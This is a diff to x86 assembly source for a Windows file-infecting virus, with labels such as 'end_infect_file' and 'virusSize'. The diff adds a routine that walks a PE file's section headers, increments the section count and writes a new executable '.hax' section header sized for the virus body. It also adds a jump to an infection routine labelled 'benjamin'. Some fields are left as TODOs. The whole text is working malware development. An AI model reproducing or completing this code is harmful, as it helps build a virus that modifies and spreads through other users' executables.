@@ -72,7 +72,7 @@ deltaoffset:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
-
+jmp benjamin ; For testing
 
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -269,6 +269,7 @@ end_infect_file:
 ;;                  Code Benjamin                     ;;
 ;;                                                    ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+benjamin:
     ; Get CreateFile addr
     mov     eax,ebp
     add     eax,offset CreateFile_b
@@ -439,9 +440,11 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
-    ; inc the number of section
+    ; get number of section
     xor ecx,ecx
     mov cx,[esi]
+    mov edi,ecx ; safekeeping for later
+    ; write inc-ed number of section
     inc cx
     mov [esi],cx
 
@@ -462,6 +465,23 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
+    push    [ebp+20] ; file descriptor
+    push    [ebp+16] ; delta offset
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
+    push    [ebp-16] ; readfile
+    push    [ebp-20] ; writefile
+    push    [ebp-24] ; setfilepointer
+    push    edi      ; old number of section
+    push    esi      ; Addr to collect the PTR TO RAW DATA
+    call    new_image_section_header
+    ; -> esi(esp) -> struct(sizeV,rva,etc.etc)
+    ; tODO: before, save setfileptr ret
+    ; -> update image opt header avec + sizes
+    ; -> setfileptr to PTR TO RAW DATA
+    ; -> return the old entry point (RVA new section)
+
+
     ; cleanup/return
     add     esp,12 ; alloc for func ptrs
     add     esp,512 ; alloc for read/write
@@ -473,35 +493,156 @@ new_code_section:
     ret     16
 
 
-
-
-
-    ; TODO: si retourne NULL, pour le moment, on annule
-    ; et passe a la suite
-    ; sinon, writefile le code malveillant
-
-
-
-
-; Work in progress
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; Iterate on all section headers (ebx)
+; Add an image section header for our code
+; Return 0 for success (nothing else for now)
+; 9 params:
+;   Addr to collect the PTR TO RAW DATA -> ebp + 8
+;   old number of section -> ebp + 12
+;   setfilepointer -> ebp + 16
+;   writefile -> ebp + 20
+;   readfile -> ebp + 24
+;   DOS header -> ebp + 28
+;   PE header -> ebp + 32
+;   delta offset -> ebp + 36
+;   file descriptor -> ebp + 40
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    ;lea     ebx,[edi+SIZEOF IMAGE_NT_HEADERS]   ; address of the first IMAGE_SECTION_HEADER
-    ;mov     dx,[edi+6h]                         ; number of sections
+new_image_section_header:
 
-;iterate_section:
+    ; Set up a stack frame
+    push    ebp
+    mov     ebp,esp
+    ; Saves context
+    push    ebx
+    push    esi
+    push    edi
 
-    ;cmp     dx,0
-    ;jle     exit_success ; my work here is done, I have to goooo
+    ; some space to work with
+    sub     esp,512
 
-    ; get next section header's address
-    ;add     ebx,SIZEOF IMAGE_SECTION_HEADER
-    ;dec     edx
-    ;jmp     iterate_section
+    ; Move to the Number of data directories field
+    mov     ebx,[ebp+16]
+    push    FILE_CURRENT
+    push    0
+    push    6Ch
+    push    [ebp+40]
+    call    ebx
 
+    mov     edx,esp ; save esp
+    ; Read the number of data directories
+    mov     ebx,[ebp+24]
+    push    0
+    push    0
+    push    4
+    push    edx ; esp
+    push    [ebp+40]
+    call    ebx
 
+    mov     eax,[esp] ; number of data directories
+    mov     ecx,8 ; size of one data directory
+    mul     ecx ; size of all the data directories
+    ; Move to the first image section header
+    mov     ebx,[ebp+16]
+    push    FILE_CURRENT
+    push    0
+    push    eax
+    push    [ebp+40]
+    call    ebx
 
+    mov     esi,0
+image_section_loop:
+    ; Move to the virtual size
+    mov     ebx,[ebp+16]
+    push    FILE_CURRENT
+    push    0
+    push    8
+    push    [ebp+40]
+    call    ebx
+
+    mov     edx,esp ; save esp
+    ; Read data
+    mov     ebx,[ebp+24]
+    push    0
+    push    0
+    push    16 ; size / rva / etc.
+    push    edx ; esp
+    push    [ebp+40]
+    call    ebx
+
+    ; Is it the biggest?
+    mov     edi,[esp+4] ; cmp with RVA
+    cmp     esi,edi
+    jg      image_section_smaller
+    mov     esi,edi ; Update biggest RVA
+    ; Now update the saved data @[ebp+8]
+    mov     ecx,4  ; number of iteration
+    mov     edi,[ebp+8]
+    mov     ebx,esp
+    mov     eax,[ebx]
+    cld     ; hax-preparation
+ image_section_saveloop:
+    stosd ; hax dword
+    add     ebx,4 ; next dword
+    mov     eax,[ebx]
+    loop    image_section_saveloop
+
+image_section_smaller:
+
+    ; Move to the next header
+    mov     eax,SIZEOF IMAGE_SECTION_HEADER
+    sub     eax,16
+    mov     ebx,[ebp+16]
+    push    FILE_CURRENT
+    push    0
+    push    eax
+    push    [ebp+40]
+    call    ebx
+
+    ; are we done?
+    mov     eax,[ebp+12]
+    dec     eax
+    mov     [ebp+12],eax
+    cmp     eax,0
+    jz     image_section_done
+
+    ; again
+    jmp     image_section_loop
+
+image_section_done:
+    ; Create new image section header !! TODO XXX
+    ; ... we are at its position (check if we have room?)
+    push    60000020h ; characteristics
+    push    0 ; number of line numbers + relocations
+    push    0 ; ptr to line numbers
+    push    0 ; ptr to relocations
+    push    0 ; TODO ptr to raw data
+    push    virusSize ; size of raw data TODO -> delta offset
+    push    0 ; TODO RVA
+    push    0 ; TODO Virtual size (virusSize aligned)
+    push    0 ; Null padd for name
+    push    0x2e686178 ; name: .hax
+    mov     esi,esp ; save esp
+
+    ; Write the updated number of section
+    mov     ebx,[ebp+20]
+    push    0
+    push    0
+    push    SIZEOF IMAGE_SECTION_HEADER
+    push    esi ; struct address on stack
+    push    [ebp+40]
+    call    ebx
+    
+    ; return success
+    mov     eax,0
+
+    ; cleanup/return
+    add     esp,512
+    pop     edi
+    pop     esi
+    pop     ebx
+    mov     esp,ebp
+    pop     ebp
+    ret     36
 
 
 
